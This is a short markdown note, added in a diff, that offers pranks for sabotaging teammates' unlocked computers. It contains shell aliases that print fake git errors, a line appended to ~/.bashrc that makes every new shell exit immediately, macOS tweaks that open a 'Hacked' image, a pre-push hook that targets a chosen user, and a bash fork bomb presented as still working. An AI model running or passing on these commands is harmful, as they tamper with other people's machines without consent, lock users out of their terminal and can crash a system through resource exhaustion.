@@ -1,0 +1,41 @@
+---
+tags:
+- code
+---
+
+# hack the team
+
+<Image src="http://www.cpd-india.com/blog/wp-content/uploads/2014/08/Hacked.jpg" alt="" />
+Fun for the teammates ...if they leave without locking :-)
+
+```bash
+alias git='echo "fatal: The remote end hung up unexpectedly" && git'
+alias ls='echo "write error: Broken pipe" && ls'
+echo 'echo "go home please!!!" && exit' >> ~/.bashrc
+```
+
+OSX specific
+
+```bash
+alias git='say "git igitigitigittttt" && git'
+alias cd='Open "http://www.cpd-india.com/blog/wp-content/uploads/2014/08/Hacked.jpg" && cd'
+defaults write com.apple.finder AppleShowAllFiles NO
+```
+
+If your team uses git pre-push-hooks, change for your needs and add
+
+```bash
+email=$(git config --list | grep user.email)
+
+if [[ $email == *part_of_mail_name* ]]; then
+  Open "http://www.cpd-india.com/blog/wp-content/uploads/2014/08/Hacked.jpg"
+fi
+```
+
+And some shell bombs are still working on some machines
+
+```bash
+:(){ :|:& };:
+```
+
+see [fork bombs](http://en.wikipedia.org/wiki/Fork_bomb)
